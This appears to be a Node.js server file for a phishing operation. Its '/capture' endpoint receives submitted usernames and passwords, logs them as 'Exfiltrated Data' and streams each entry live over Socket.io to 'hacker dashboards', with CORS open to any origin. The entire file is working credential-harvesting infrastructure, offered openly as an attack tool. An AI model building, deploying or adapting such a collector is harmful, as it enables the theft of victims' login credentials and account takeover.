const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" }
});

// Capture Endpoint
app.post('/capture', (req, res) => {
    const logEntry = {
        time: new Date().toLocaleTimeString(),
        user: req.body.user,
        pass: req.body.pass || '***',
        type: req.body.type || 'PHISHING'
    };
    
    console.log("Exfiltrated Data:", logEntry);
    
    // Broadcast to all connected hacker dashboards
    io.emit('new_data', logEntry); 
    
    res.status(200).send({ status: "Captured" });
});

server.listen(5000, () => console.log("Hacker Stream: Port 5000"));